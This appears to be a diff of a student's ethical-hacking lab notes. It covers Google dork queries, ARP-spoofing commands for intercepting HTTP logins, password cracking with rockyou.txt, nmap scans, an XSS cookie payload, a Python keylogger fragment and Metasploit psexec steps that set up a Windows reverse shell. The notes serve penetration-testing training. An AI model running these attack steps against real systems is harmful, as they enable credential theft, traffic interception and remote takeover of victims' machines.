@@ -1,3 +1,10 @@
+1)
+1 site:reddit.com
+2 site:reddit.com inurl:login
+3 site:w3schools.com filetype:pdf
+4 intitle:"index of" Reddit
+
+
 
 2.2)
 cabin abel
@@ -24,6 +31,27 @@ rockyou.txt file
 9) insert you rockyou.txt file --> start 
 
 
+
+
+3)
+ip a
+sudo apt install dsniff
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+ping (windows ip)
+terminal 1 sudo arpspoof -i etho -t (ip address) (gateway)
+terminal 2 sudo arpspoof -i etho -t (gateway) (ipaddress)
+
+on windows terminal -->  arp -a
+
+on kali linux - wireshark caputure packets
+
+windows seach test.php -- login
+
+wireshark stop --> search http 
+
+
+
+
 4)
 1) scanme.nmap.org
 
@@ -47,6 +75,8 @@ nmap -sX -p 22 scanme.nmap.org
 target type -- > 8.8.8.8
 
 
+
+
 6) CSS 
 
 click on XSS 
@@ -58,6 +88,7 @@ click on XSS
 2)
 --> name = XYZ
 --> message = <script>alert(document.cookie)</script>
+
 
 
 9)
@@ -78,9 +109,25 @@ with Listener(on_press=on_press) as listener:
     listener.join()
 
 
+
+
 10)
 1) msfconsole 
 
 2) use exploit/windows/smb/psexec
 
-3) set payload/windows/shell/reverse_tcp
+3) set RHOST (WINDOWS IP)
+
+4) set payload/windows/shell/reverse_tcp
+
+5) set LHOST (WINDOWS IP)
+
+6) set LPORT 4444
+
+7) set SMBUser victim
+
+8) set SMBPass password
+
+9) show options
+
+10) exploit
